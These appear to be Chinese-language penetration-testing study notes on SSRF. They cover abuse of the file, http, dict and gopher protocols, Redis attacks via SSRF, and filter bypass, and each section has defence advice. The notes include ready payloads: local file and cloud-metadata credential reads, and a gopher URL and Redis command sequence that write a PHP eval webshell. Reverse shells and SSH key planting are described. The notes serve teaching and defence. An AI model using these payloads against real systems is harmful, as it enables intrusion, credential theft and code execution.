
# SSRF漏洞利用

## 利用相关协议进行SSRF攻击

### 利用file协议进行SSRF攻击
在 SSRF（服务端请求伪造）漏洞中，**`file` 协议利用**是指攻击者利用服务端未对 URL 协议方案（Scheme）进行严格白名单校验的缺陷，==将请求协议由常规的 `http://` 或 `https://` 替换为 `file://`，迫使后端网络请求函数去读取服务器本地文件系统的内容，直接造成**任意本地文件读取（Local File Inclusion / Arbitrary File Read）**==


1. ==触发原理与先决条件==

当应用程序接收外部传入的 URL 并向该地址发起资源请求时，如果底层调用的网络客户端或函数库默认支持多协议解析，就会触发该行为：

例：
![](Pasted%20image%2020260904121535.png)

触发核心条件

1. **未限制协议协议头**：服务端代码未限制 Scheme 仅允许 `http` 或 `https`。
    
2. **底层库原生支持 `file://`**：发起请求的库或系统组件默认包含本地文件流驱动。
    
3. **响应内容可见（或间接导出）**：服务端将请求响应内容直接返回给前端，或写入到了用户可下载的报表/预览缓存中

---


2. ==常见后端库对 file 协议的支持情况==

|**语言/库**|**默认是否支持 file://**|**说明**|
|---|---|---|
|**PHP - `file_get_contents()`**|**支持**|原生支持各类 Wrapper 协议，直接读取本地文件。|
|**PHP - `curl`**|**支持**|默认支持多协议，除非手动指定 `CURLOPT_PROTOCOLS`。|
|**Java - `java.net.URL`**|**支持**|原生支持 `file:` 协议头，直接通过 `openStream()` 读取。|
|**Python - `urllib` / `urllib2`**|**支持**|早期及标准库的 `urllib.request.urlopen` 支持 `file:` 方案。|
|**Python - `requests`**|**不支持**|原生仅支持 HTTP/HTTPS，若传入 `file://` 会抛出 `InvalidSchema`。|
|**Node.js - `axios` / `fetch`**|**不支持**|默认仅支持 HTTP/HTTPS，需借助非官方适配器才可能读取本地。|
|**Go - `net/http`**|**不支持**|标准客户端仅处理 HTTP/HTTPS 请求。|



3. ==Payload 构造规范与高价值目标==

语法规范

- **Linux 系统**：标准格式为 3 个斜杠 `file:///path/to/file`（第三个斜杠代表根目录 `/`）。
    
- **Windows 系统**：格式多为 `file:///C:/path/to/file` 或 `file:///C|/path/to/file`。



Linux 常见目标文件

例：
![](Pasted%20image%2020260904121707.png)



Windows 常见目标文件

例：
![](Pasted%20image%2020260904121738.png)



4. ==典型利用场景与链式攻击==

利用 `file` 协议进行 SSRF 绝不仅仅止于“读取 `/etc/passwd`”，在实战中通常作为攻击链的前置环节：

1. **源码审查与白盒利用**：
    
    - 通过 `file:///proc/self/cmdline` 确定项目根目录（例如 `/var/www/html/app.py` 或 `/opt/app/target.jar`）。
        
    - 读取应用源码或反编译二进制包，寻找未授权 API、硬编码密钥、反序列化利用点或 SQL 注入。

2. **提取凭证接管云资产**：
    
    - 在容器化环境（Docker/K8s）中，通过 `file:///proc/self/environ` 获取云服务商凭据（如 AWS IAM Access Key、阿里云 RAM Key），进而脱离 Web 权限直接横向控制云资源。

3. **定位 Session 与反序列化利用**：
    
    - 读取 PHP session 存储文件（如 `file:///tmp/sess_[PHPSESSID]`），配合反序列化漏洞实现 RCE

---

5. ==绕过技巧（针对弱防御）==

当目标对输入实施了简单的黑名单或正则拦截时，常见的变形利用手段包括：

- **URL 编码绕过**：
    
    - 对冒号或斜杠进行编码：`file%3A///etc/passwd`、`file:%2F%2F%2Fetc%2Fpasswd`。
        
    - 二次 URL 编码：针对后端中间件解密后再传给请求库的场景。

- **大小写混合**：
    
    - `File:///etc/passwd` 或 `FILE:///etc/passwd`（部分请求库协议不区分大小写，但正则若缺少 `i` 标识会被绕过）。

- **指定主机名格式**：
    
    - RFC 标准中 `file` 协议结构为 `file://<host>/<path>`，本地通常省略 `<host>`。可显式补充主机名绕过仅以 `file:///` 为特征的过滤：
        
        - `file://localhost/etc/passwd`
            
        - `file://127.0.0.1/etc/passwd`




6. ==防御与修复方案==
---

1. 严格白名单限制 Scheme（根本防御）

在将 URL 传递给请求库之前，通过严谨的 URL 解析器提取协议方案，只允许 `http` 和 `https`


2. 禁用底层库的多协议支持

如果使用 cURL 等底层工具，应通过配置显式封禁不需要的协议


3. 最小权限原则（降低影响）
- Web 运行服务（如 `www-data`、`nobody`）禁止使用 root/Administrator 运行。
    
- 对敏感系统文件（如 `/etc/shadow`、SSH 私钥、日志文件）设置严格的读取权限（`chmod 600` 或 `chmod 700`）。
    
- 在容器运行环境中，去除不必要的挂载点，并避免向容器注入敏感环境变量







SSRF漏洞一般都可以作为任意文件读取利用，因为PHP或者Java的URL类
都支持file协议，它可以读取服务器上的文件，例如：
`?url=file:///etc/passwd`


![](c29fcac98231f305b09776484b5a68a9.jpeg)




### 利用http协议进行SSRF攻击
在 SSRF（服务端请求伪造）利用中，**`http://` 和 `https://` 协议是适用范围最广、最基础的攻击载体**。

与 `gopher://` 或 `dict://` 等经常被底层网络库（如 Python `requests`、Node.js `axios`）默认禁用的协议不同，HTTP/HTTPS 几乎被所有发起网络请求的客户端库原生支持。==攻击者借助服务端作为跳板，以目标内网信任实体的身份，向外网不可触达的内网主机、本地回环接口或云基础设施发起 HTTP 交互==


1. ==核心利用场景==


1.1 内网资产存活探测与端口扫描

由于防火墙通常只防御外网直接访问，内网往往缺乏纵深防护。攻击者可构造不同内网 IP 与端口的 HTTP 请求，根据服务端的**响应状态码**、**报错差异**或**网络耗时**推断目标状态：

- **开放 Web 端口**：返回正常 HTTP 响应包体、200 OK、403 Forbidden 或 404 Not Found。
    
- **开放非 Web 端口**（如 SSH 22、MySQL 3306）：底层 HTTP 库通常在短时间内抛出协议解析异常（如 `Protocol Error`、`Empty reply from server`、`Malformed HTTP status code`）。
    
- **未开放端口 / IP 存活**：立即返回 `Connection Refused`（连接被拒绝）。
    
- **IP 不存活 / 被黑洞丢弃**：等待直到连接超时（`Connection Timeout`），响应耗时显著增长。
    

> 常见探测网段包括：`127.0.0.1`、`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`






1.2 窃取云服务元数据（Cloud Metadata API 滥用）

在 AWS、GCP、阿里云、腾讯云等公有云或混合云架构中，云主机通过特殊的链路本地地址（Link-local Address）获取实例身份与元数据。由于内网信任机制，若机器未做鉴权加固，SSRF 可直接提取高权限凭据：

|**云厂商**|**典型元数据端点 (HTTP GET)**|**敏感获取内容**|
|---|---|---|
|**AWS (IMDSv1)**|`[http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)<role-name>`|临时 AccessKeyId、SecretAccessKey、Token|
|**阿里云**|`[http://100.100.100.200/latest/meta-data/ram/security-credentials/](http://100.100.100.200/latest/meta-data/ram/security-credentials/)<role-name>`|RAM 角色临时访问密钥|
|**腾讯云**|`[http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/](http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/)<role-name>`|CAM 临时安全凭证|
|**OpenStack**|`[http://169.254.169.254/openstack/latest/meta_data.json](http://169.254.169.254/openstack/latest/meta_data.json)`|虚拟机配置、公钥、租户信息|

攻击者获取上述凭据后，可通过云厂商 CLI 直接接管内网其他云资源（如 S3/OSS 存储桶、RDS 数据库、安全组配置等）




1.3 攻击内网未授权/弱口令 Web API 与基础组件

内网中大量监控、运维、容器与微服务组件默认绑定在所有网卡（`0.0.0.0`），且缺乏认证授权：

- **Spring Boot Actuator**：
    
    - `[http://127.0.0.1:8080/actuator/env](http://127.0.0.1:8080/actuator/env)`（提取包含明文凭据的环境变量）
        
    - `[http://127.0.0.1:8080/actuator/heapdump](http://127.0.0.1:8080/actuator/heapdump)`（下载堆内存转储文件，提取密码）

- **Elasticsearch**：
    
    - `[http://127.0.0.1:9200/_cat/indices?v](http://127.0.0.1:9200/_cat/indices?v)`（查看内网索引）
        
    - `[http://127.0.0.1:9200/](http://127.0.0.1:9200/)<index>/_search`（未授权查询内网敏感业务数据）
    
- **Docker Remote API**（默认暴露 2375 端口）：
    
    - `[http://127.0.0.1:2375/version](http://127.0.0.1:2375/version)`（验证暴露）
        
    - 若 SSRF 支持 POST 或借助某些反向代理，甚至可直接调用 API 挂载主机根目录创建容器，实现逃逸与 RCE。

- **Kubernetes API / etcd**：
    
    - `[http://127.0.0.1:2379/v2/keys/?recursive=true](http://127.0.0.1:2379/v2/keys/?recursive=true)`（读取 etcd 未授权配置与 Token）

- **Consul / Eureka / Nacos**：
    
    - 访问注册中心拉取完整的内网微服务拓扑与路由信息




1.4 配合 HTTP 30x 重定向绕过过滤

很多业务在代码层设置了域名或协议检查（例如：仅验证用户输入的 URL 是否为 `[https://safe-domain.com](https://safe-domain.com)`）。

若目标网络库**默认跟随重定向（Follow Redirects）**，攻击者可在自己控制的外网服务器上配置 302 跳转：

例：
![](Pasted%20image%2020260904134020.png)


1. 后端验证输入为 `[https://safe-domain.com/redirect](https://safe-domain.com/redirect)`，通过白名单校验。
    
2. 后端发起请求，外网服务器返回 `302` 重定向至内网目标。
    
3. 后端若未对二次跳转的地址重新校验，将直接跨过防御访问内网

---


2. ==常见内网 IP 过滤与绕过技巧==

当应用试图通过关键字匹配（如禁止包含 `127.0.0.1`、`localhost`）来防范 HTTP SSRF 时，常见的编码与解析绕过方式包括：

例：
![](Pasted%20image%2020260904134113.png)





3. ==防御与安全修复==

单纯过滤特定协议、使用黑名单关键字极易被变形绕过。防御 HTTP 协议 SSRF 必须采用**严谨的网络与代码双层防御**：

1. 代码层安全解析与 IP 白名单校验
必须在**域名解析（DNS 查找）之后**验证目标真实 IP，坚决阻止连接私网与保留网段



2. 禁用自动重定向
在 cURL、Requests 等客户端中，将 `allow_redirects` 或 `CURLOPT_FOLLOWLOCATION` 设为 `False`。若业务必须跟随重定向，需对每个重定向跳转的 `Location` URL 重新执行协议与 IP 合规性检验。


3. 云环境启用 IMDSv2 强制加固
在 AWS 等云平台中，将元数据模式强制切换为 **IMDSv2**。IMDSv2 要求通过 `PUT` 请求配合特定的自定义 Header（如 `X-aws-ec2-metadata-token-ttl-seconds`）先获取会话 Token，能有效化解绝大多数无法注入自定义 Header 的常规 HTTP GET SSRF 攻击







http协议也是SSRF漏洞利用中常用的一种协议，用于访问WEB服务。例
如，通过SSRF漏洞来访问内网资产：
`?url=http://192.168.1.1/index.php?a=1`


http协议当然也可以用于web端口扫描，只需要遍历端口号即可，例如
`?url=http://192.168.1.1:8080/?url=http://192.168.1.1:8081/`










### 利用dict协议进行SSRF攻击
在 SSRF（服务端请求伪造）利用中，**`dict` 协议（Dictionary Server Protocol，RFC 2229）** 是一种基于明文 TCP 的文本协议（默认端口为 2628）。

在安全测试中，`dict` 协议通常被用作“通用 TCP 探测与单行指令交互载体”。==当目标环境禁用了 `gopher://`，或者 HTTP 客户端因格式解析失败无法回显非 HTTP 服务内容时，`dict` 协议是探测内网服务真实指纹、甚至向特定纯文本服务（如 Redis、Memcached）发送单行指令的替代手段==



1. ==为什么在 SSRF 中选择 dict 协议==

在使用 `http://` 探测内网端口时，若目标端口运行的是非 HTTP 服务（例如 22 端口的 SSH 或 3306 端口的 MySQL），底层 HTTP 客户端会因收不到标准的 HTTP 响应头而抛出 `Invalid HTTP response` 等异常，往往无法将服务返回的原生内容输出给攻击者。

相比之下，`dict` 协议具备以下特性：

1. **原生支持返回纯文本 Banner**：`dict` 客户端连接目标 TCP 端口后，会直接读取服务端的欢迎回显（Banner），从而能够精确识别端口上运行的真实服务与版本。

2. **支持构造单行 TCP 指令**：通过 URL 路径传参，`dict` 允许向目标端口写入命令文本并触发执行。

3. **绕过简单的协议黑名单**：部分防御策略仅封禁了 `gopher://` 或 `file://`，但忽视了 cURL 等网络库默认启用的 `dict://`

---



2. ==核心利用场景==


2.1 内网端口精准探测与服务指纹识别（Banner Grabbing）

攻击者向目标服务的内网地址发起 `dict` 请求，可以直接获取内网主机开放端口的原始 Banner，比单纯判断端口超时或连通性更精准


例：
![](Pasted%20image%2020260904134920.png)



2.2 针对未授权 Redis 的单行/分步利用

Redis 的 RESP 协议向下兼容纯文本的 Inline 命令模式。在特定 cURL 解析逻辑中，`dict://` URL 中的冒号（`:`）会被解析为空格或者作为独立参数分片送出，使得攻击者可以分步执行简单的 Redis 命令。

1. 探测与信息收集

例：
```
dict://127.0.0.1:6379/info
```
通过返回的 `redis_version`、`os`、`role` 等参数确认 Redis 是否未配置密码，并判断底层运行权限



2. 分步写入 WebShell（以 PHP 站点为例）

若目标 Web 目录已知且 Redis 服务具备写入权限，可通过多次独立的 SSRF 请求逐条发送命令：

例：
![](Pasted%20image%2020260904135254.png)




3. 写入计划任务反弹 Shell（Linux/CentOS 环境）

例：
![](Pasted%20image%2020260904135330.png)



2.3 探测与操作 Memcached

Memcached 默认同样支持纯文本命令且多无认证机制，`dict` 可用于获取状态或执行增删查改：

例：
![](Pasted%20image%2020260904135448.png)




3. ==`dict` 与 `gopher、http` 协议的对比==

| 维度                | HTTP / HTTPS      | DICT                     | GOPHER                          |
| ----------------- | ----------------- | ------------------------ | ------------------------------- |
| **协议设计初衷**        | Web 资源获取          | 字典查询服务 (RFC 2229)        | 分布式文档检索 (RFC 1436)              |
| **底层数据流**         | 强制附加 HTTP Header  | 纯文本行传输                   | 任意原始 TCP 字节流（Raw Socket）        |
| **非 HTTP 端口指纹识别** | 较差（易抛出协议异常）       | **优秀**（直接回显 Raw Banner）  | 良好（需手动构造触发包）                    |
| **多行与复杂 Payload** | 极差（受请求方法限制）       | 较差（单次请求通常仅限单行）           | **极强**（支持 `%0d%0a` 多行/二进制）      |
| **常见利用场景**        | 云元数据窃取、内网 Web API | 指纹识别、无认证 Redis/Memcached | 复杂内网渗透（MySQL、FastCGI、Redis RCE） |
| **cURL 默认支持状态**   | 默认支持              | 多平台编译默认集成                | 近期部分发行版开始默认禁用                   |



4. ==利用局限性==
---

1. **缺乏对多行及二进制流的良好支持**：
    
    `dict` 本身并不是为了转发任意二进制设计的。面对需要完整握手认证的协议（如 MySQL 认证包、PostgreSQL）或需要严格跨行换行（CRLF）的协议时，`dict` 难以像 `gopher` 那样打包复杂的 Payload。

2. **客户端实现差异**：
    
    并非所有 HTTP 客户端都内建 `dict`。例如 Python 的 `requests`、Node.js 的 `axios`、Go 的 `net/http` 均不支持 `dict://`；该利用几乎完全依赖于调用了 **libcurl** 的后端（如 PHP `curl` 扩展、系统命令行 `curl`）或支持全协议的特殊客户端。

---

5. ==防御与加固措施==

---

1. 强制协议白名单（最有效）

在服务端处理外部 URL 之前，显式校验 Scheme，仅放行业务需要的 `http` 与 `https`，直接封杀 `dict://`、`gopher://`、`file://` 等非必要协议


2. 限制 cURL 允许的协议

若业务使用 PHP cURL 或底层 libcurl，需通过配置明确限制请求协议与重定向协议


3. 内网服务纵深防御（消除无认证暴露）

- **开启强认证**：为 Redis 设置高强度密码（`requirepass`），禁用危险指令（如 `rename-command FLUSHALL ""`、`rename-command CONFIG ""`）。
    
- **网络隔离与绑定**：所有内部组件（Redis、Memcached、数据库）禁止监听 `0.0.0.0`，仅监听 `127.0.0.1`，并通过防火墙阻断 Web 容器跨网段访问敏感端口







dict用于访问网络上的字典服务器，在SSRF攻击中一般用来探测端口是否开放，且可以发起TCP连接发送简单报文并获取服务端的原始TCP响应报文

基本用法，它的协议格式为
`dict://<host>[:<port>]/<database>/<word>`
例：`dict://172.22.10.10:3306/`

高级用法，redis指令操作
例：`dict://127.0.0.1:6379/auth:123456`



例：
![](bc5844cae330b25360fcb5fa2cce3a7e.jpeg)










### ==利用gopher协议进行SSRF攻击==
**Gopher 协议**诞生于 HTTP 之前，是一种结构极简的信息检索协议。在 SSRF（服务端请求伪造）漏洞中，==Gopher 协议被称为“万能协议”，因为它可以向目标服务器的任意 TCP 端口发送**无状态的自定义原始字节流**==

借助 Gopher，攻击者可以将原本受限于 HTTP GET 的 SSRF，转化为对内网各类服务（如 Redis、FastCGI、MySQL、Memcached 等）发起任意协议交互的攻击跳板


1. ==Gopher 协议基础与 URL 格式==

基本 URL 结构

例：
```
gopher://<host>:<port>/_<payload>
```
- **端口 (`<port>`)**：可以指定任意 TCP 端口（如 Redis 6379、FastCGI 9000、MySQL 3306）。
    
- **下划线 (`_`) 的作用**：在 Gopher 协议规范中，URL 路径中的第一个字符代表“信息类型”（Item Type，例如 `0` 表示纯文本，`1` 表示目录）。像 `cURL` 这样的客户端在建立 TCP 连接后，会**吃掉第一个字符**，从第二个字符开始向服务端发送数据。因此，通常使用 `_` 作为占位符，防止真实 Payload 的第一个字符被吞掉



编码机制（CRLF 与 URL 编码）

大多数内网协议（如 HTTP、Redis RESP、SMTP）均以回车换行符（`\r\n`，十六进制为 `0x0D 0x0A`）作为指令或行结束标志。

1. **单次编码**：在构造 Gopher Payload 时，换行符必须转换为 `%0d%0a`。

2. **多次编码（二次编码/三次编码）**：
    
    - 如果通过 Web 接口传参（例如 `curl.php?url=gopher://...`），Web 服务器在接收参数时会自动进行一次 URL 解码。
        
    - 如果直接传入 `%0d%0a`，服务器解析后会在代码层面变成真正的 `\r\n`，可能导致 HTTP 响应头截断（CRLF Injection）或 cURL 解析错误。
        
    - **解决方案**：对 `%` 进行再次编码，即将 `%0d%0a` 转换为 `%250d%250a`。根据数据流经的解析层数，可能还需要进行更多次 URL 编码


---


2. ==常见攻击利用场景==

==场景一：构造任意内部 HTTP POST 请求==

传统的 SSRF 参数通常只能控制后端发起 HTTP GET 请求，无法提交复杂的 POST Body 或自定义 Header。利用 Gopher 可以完整伪造 HTTP 请求。

例如伪造如下 POST 数据包：

例：
![](Pasted%20image%2020260904140939.png)

转换为 Gopher 协议（注意行尾的 `\r\n` 和空行）：

例：
```
gopher://192.168.1.10:80/_POST%20/admin/addUser%20HTTP/1.1%0d%0aHost:%20192.168.1.10%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2027%0d%0a%0d%0ausername=admin&role=manager%0d%0a
```


场景二：未授权/弱口令 Redis 攻击利用

内网中的 Redis 通常部署在默认的 `6379` 端口，且常存在未配置密码或仅绑定本地的情况。利用 Gopher 发送 RESP（Redis Serialization Protocol）协议数据包，可以实现以下利用：

1. 写 Webshell

若内网目标服务器同时运行了 Web 容器，且已知 Web 根目录物理路径：

例：
![](Pasted%20image%2020260904141039.png)


使用 RESP 协议编码后通过 Gopher 发送：

例：
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0ax%0d%0a$30%0d%0a<?php @eval($_POST['cmd']); ?>%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
```



2. 写 Crontab 定时任务反弹 Shell

针对 Linux 系统（通常需 Redis 以 root 用户权限运行）：


例：
![](Pasted%20image%2020260904141131.png)


3. 写 SSH 公钥免密登录

利用 `config set dir /root/.ssh/` 和 `config set dbfilename authorized_keys` 写入攻击者的公钥



场景三：攻击 FastCGI (PHP-FPM)

PHP-FPM 默认监听 `9000` 端口（或本地 UNIX Domain Socket）。如果 FPM 配置不当，直接监听在 `0.0.0.0:9000` 或 `127.0.0.1:9000` 且未校验客户端来源，可通过 Gopher 伪造 FastCGI 协议二进制报文。

- **原理**：FastCGI 协议包含多个 Record（如 `FCGI_BEGIN_REQUEST`、`FCGI_PARAMS`、`FCGI_STDIN`）。
    
- **利用方式**：通过设置 `PHP_VALUE` 或 `PHP_ADMIN_VALUE` 环境变量（如开启 `allow_url_include = On`，并指定 `auto_prepend_file = php://input`），将待执行的 PHP 代码放在 `FCGI_STDIN` 报文体中，直接达成任意代码执行（RCE）




场景四：攻击内网 MySQL (未授权或空密码)

MySQL 服务工作在 `3306` 端口。当数据库存在空密码账户（如 `root` 无密码且允许本地登录）时，可通过 Gopher 发送 MySQL Client 认证与查询二进制包：

1. 捕获或伪造 MySQL 客户端连接时的认证应答包（Client Authentication Packet）。
    
2. 发送查询命令（COM_QUERY），执行 `SELECT ... INTO OUTFILE` 写入后门，或读取敏感表数据


3. ==常用自动化生成工具==
由于二进制协议与 RESP 协议的手工组包和 URL 编码极其繁琐，实际测试中多依赖自动化脚本：

|**工具名称**|**适用场景**|**特点**|
|---|---|---|
|**Gopherus**|Redis、FastCGI、MySQL、PostgreSQL、Zabbix 等|最经典的 Gopher Payload 自动化生成工具，直接生成对应攻击类型的 SSRF Gopher URL。|
|**curl2gopher**|任意 HTTP POST / 自定义请求|将标准的 cURL 命令或 Burp HTTP 请求转为 Gopher 编码格式。|
|**GopherClient / 自编 Python**|自定义二进制交互|适合针对特定私有 TCP 协议、Memcached 等服务的定制化交互。|





4. . 防御与加固方案
---

1. **禁用危险协议（最有效防御）**
    
    - 在网络请求库（如 cURL）中显式限制协议白名单，仅允许 `http` 和 `https`


2. **严防 30x 重定向绕过**

- 某些系统限制了初始 URL 只能为 HTTP，但开启了 `CURLOPT_FOLLOWLOCATION`。攻击者可通过恶意 HTTP 服务返回 `302 Found` 并将 `Location` 指向 `gopher://`。必须对跟随重定向的协议一并限制（如配置 `CURLOPT_REDIR_PROTOCOLS`）


3. **内网服务权限加固与隔离**

- **Redis**：强制设置高强度密码（`requirepass`），避免使用 root 权限运行，重命名高危命令（如 `CONFIG`、`FLUSHALL`）。
    
- **PHP-FPM**：监听本地 UNIX Domain Socket 代替 TCP 端口；若必须监听 TCP，配置 `listen.allowed_clients` 白名单。
    
- **网络分段**：通过安全组与防火墙严格限制 Web 服务器与内网缓存、数据库服务器之间的端口通信权限








Gopher协议是一种早期互联网信息检索协议，主要用于在网络上浏览和
分发文本文档，它诞生于1991年，比万维网（WWW/HTTP）出现还要
早一点，但是由于HTTP的优势，后来逐渐被HTTP/HTML取代。

Gopher协议支持完全自定义TCP数据包Body，因此在SSRF攻击中发挥
着不可替代的作用，它的协议格式如下：
`gopher://<host>[:<port>1/<type><selector>`
`gopher://127.0.0.1:6379/1/world`




![](a965f6bd746ce7e70b997afc34ddea26.jpg)






在SSRF攻击中，Gopher最常见的用法就是用于构造POST数据包，因为
HTTP协议不支持POST请求。以下是构造一个用于POST请求的Gopher包
的步骤：

1. 构造HTTP完整TCP格式数据包。
2. 进行URL编码。
3. 拼接到Gopher协议中。

例：
```
gopher://127.0.0.1:80/_POST%20/%20HTTP/1.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AHost%3A%20www.example.com%oD%0AContent-Length%3A%209%0D%0A%0D%0Akey%3Dvalue
```






## 内网服务攻击

### **利用SSRF漏洞对内网服务redis服务进行攻击**
在 SSRF（服务端请求伪造）攻击链中，内网未授权或弱口令的 Redis 服务是最高频且危害极大的攻击目标。==攻击者利用存在 SSRF 的服务器作为跳板，借助特定协议向内网 Redis 发送构造好的恶意指令，通常可直接导致内网主机被植入 Webshell、写入 SSH 公钥或通过定时任务反弹 Shell，最终实现远程代码执行（RCE）==


1. ==核心攻击原理==

SSRF 攻击内网 Redis 能够成立，主要依赖于以下三个脆弱点：

1. **边界信任缺失与未授权访问**：内网环境往往被默认视为“可信区”，大量企业内部部署的 Redis 实例未配置密码（或使用弱口令），且默认监听 `0.0.0.0:6379`。

2. **Redis 协议的容错性（宽松解析）**：Redis 采用文本协议（RESP，REdis Serialization Protocol），同时也支持纯文本的行内命令（Inline Command）。**当遇到未知或错误的指令时，Redis 仅返回报错，但不会主动断开 TCP 连接**，仍会继续执行后续有效指令。这使得即便 HTTP 请求头混杂在数据流中，攻击者注入的命令仍能被执行。

3. **支持任意 TCP 数据流的协议封装（Gopher/Dict）**：
    
    - **Gopher 协议**：支持指定目标 IP、端口及发送任意原始 TCP Payload，且允许通过 URL 编码自由控制 `\r\n`（回车换行）。它是构造完整 Redis 复杂攻击链的核心载体。
        
    - **Dict 协议**：支持直接向端口发送单行命令并获取回显（格式为 `dict://ip:port/command:args`），但难以直接处理包含多行或复杂换行的文件写入操作


---


2. ==常用利用协议与 Payload 构造==

--- 

1. Gopher 协议数据流封装

Redis 指令必须通过 `\r\n`（十六进制 `0x0D 0x0A`）结尾。利用 Gopher 协议时，基础格式如下：

例：
```
gopher://<Redis_IP>:6379/_<URL编码后的Redis命令>
```
>**注意（URL 编码层级）：** 如果 SSRF 漏洞点是通过 HTTP GET 参数接收 URL，浏览器/客户端会先做一次 URL 解码，后端服务端接收后再请求 Gopher 时又会解析一次。因此，Payload 中的换行符通常需要进行**二次 URL 编码**（`\r\n` $\rightarrow$ `%0d%0a` $\rightarrow$ `%250d%250a`）


2. RESP 协议 vs 行内命令

攻击者通常可以使用简洁的行内命令格式，也可以使用严格的 RESP 序列化格式（RESP 兼容性更好，不受空格解析歧义影响）：

例：
![](Pasted%20image%2020260904150944.png)


转化为 Gopher Payload 结构示例：

例：
```
gopher://172.16.1.10:6379/_flushall%0d%0aconfig%20set%20dir%20/tmp%0d%0aconfig%20set%20dbfilename%20test.txt%0d%0aset%20test%20%22hello%22%0d%0asave%0d%0aquit%0d%0a
```





3. ==四种核心利用场景==
---

1. 绝对路径写入 Webshell

- **适用条件**：目标机器同时运行 Web 服务，且攻击者已知 Web 目录的绝对路径（如通过报错泄漏），同时 Redis 运行权限对该目录具备写权限。
    
- **执行逻辑**：利用 Redis 的持久化转储机制（RDB），将包含恶意代码的键值转存至 Web 目录下的 `.php` / `.jsp` 文件

例：
![](Pasted%20image%2020260904151035.png)



2. 写入 Crontab 定时任务反弹 Shell

- **适用条件**：Redis 以 `root` 权限运行。
    
- **系统差异注意**：
    
    - **CentOS / RHEL**：crontab 解析机制较为宽松，即便 RDB 产生的二进制杂质混杂在文件内，定时任务仍可正常触发。
        
    - **Ubuntu / Debian**：对 `/var/spool/cron/crontabs` 文件的权限（必须为 0600）及语法格式校验极其严苛，RDB 的二进制乱码通常会导致 cron 语法解析失败报错，因此该方式在 Ubuntu 上极易失效



例：
![](Pasted%20image%2020260904151056.png)



3. 写入 SSH 公钥直接登录

- **适用条件**：Redis 以 `root` 或特定系统用户身份运行，且宿主机开启了 SSH 密钥认证（`/root/.ssh/` 或 `/home/user/.ssh/` 存在且可写）。
    
- **执行逻辑**：将攻击者的 SSH Public Key 写入目标用户的 `authorized_keys`


例：
![](Pasted%20image%2020260904151114.png)





4. 主从复制加载恶意模块 RCE（Redis 4.x / 5.x+）

当目标系统限制文件写入路径（如开启了沙箱、非 root 运行且无法写入 Web 目录或 Crontab）时，传统写文件手段失效。Redis 4.0 引入了外部模块加载机制（`MODULE LOAD`），可通过主从复制实现内存级代码执行：

1. 攻击者在公网（或内网受控机）搭建一台恶意 Redis 伪造服务器（Rogue Server）。
    
2. 通过 SSRF 发送 Gopher 指令，让目标内网 Redis 执行：

例：
![](Pasted%20image%2020260904151140.png)

3. 伪造服务器向目标发送包含全量同步（Fullresync）的载荷，将编译好的恶意外发模块动态链接库（`exp.so`）直接同步并写入目标机 `/tmp/exp.so`。
    
4. 发送后续指令加载模块并执行系统命令：

例：
![](Pasted%20image%2020260904151212.png)





4. ==防御与加固方案==

SSRF 攻击内网 Redis 属于复合型威胁，需要从“Redis 自身加固”与“应用层 SSRF 防御”双维度进行协同防御。

|**防御层面**|**具体防护策略**|**核心配置/实现方式**|
|---|---|---|
|**Redis 自身加固**|**强制开启认证**|在 `redis.conf` 中配置高强度 `requirepass`。|
||**绑定特定地址**|避免监听 `0.0.0.0`，严格限定为 `bind 127.0.0.1` 或专用内网 VLAN 地址。|
||**启用保护模式**|保持 `protected-mode yes`（未配置 bind 和密码时禁止外网访问）。|
||**禁用高危命令**|重命名或禁用敏感指令：`rename-command CONFIG ""`、`FLUSHALL ""`、`MODULE ""`。|
||**降权运行**|严禁用 root 账户启动 Redis，使用专属的低权限账户（如 `redis`）。|
|**应用/网络层防护**|**协议白名单**|严格限制 URL 协议，仅允许 `http` / `https`，阻断 `gopher://`、`dict://`、`file://`。|
||**内网地址过滤 (SSRF)**|解析目标域名 IP 后，在应用层检查是否属于私有网段（`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`、`127.0.0.1`）。|
||**防 DNS 重绑定 (Rebinding)**|避免直接使用用户传入的域名做网络请求，应在验证 IP 合规后，直接基于该 IP 发起连接，或在请求头中校验 Host。|
||**网络微分段与防火墙**|部署 Egress 出口防火墙与内网访问控制策略，禁止 Web 应用服务器的主机主动访问 Redis 的 6379 端口（除非业务明确需要）。|







Redis是很常见也最容易被攻击者利用的内网服务，利用未授权访问攻击
Redis的方法有很多，可以主从同步攻击、写webshell、计划任务，也可
以写ssh公钥，这里介绍利用SSRF攻击内网未授权的Redis服务写
webshell的方法。


Redis执行以下命令就会在web的根目录/var/www/html生成一个PHP
webshell

例：
```
flushall
set 1'<?php eval($_GET["a"]):?>
fcmit.cc
config set dir /var/www/html
config set dbfilename shell.php
save
```


例：
![](aa4fd627e5e82f8c2952ca1d1f2c4c58.jpg)







由于需要向redis监听端口发送TCP数据，因此我们需要使用gopher协议
来完成攻击，首先需要把payload转为gopher形式：

`gopher://127.0.0.1:6379/&lt;payload的URL编码格式>`
可以使用以下的脚本来生成

例：
![](90f3c3c225a9089a1388d996d987e98f.jpeg)





## 绕过相关限制进行SSRF攻击

### 利用IP地址多种写法绕过相关限制进行SSRF攻击
在服务端请求伪造（SSRF）防御中，==最常见的缺陷是**仅在应用层使用简单的黑名单正则过滤**或**忽略了网络协议栈在多阶段解析时的差异**。当防护机制仅校验字面字符串或单次域名解析时，攻击者可以通过格式转换、解析差异、协议流转和网络状态机特性完成绕过==


1. ==IP 表达格式与进制变形==

操作系统和底层网络库（如 C 语言的 `inet_aton`）支持多种进制及缺省写法，而很多前端正则仅匹配标准的点分十进制格式（`127.0.0.1`）。

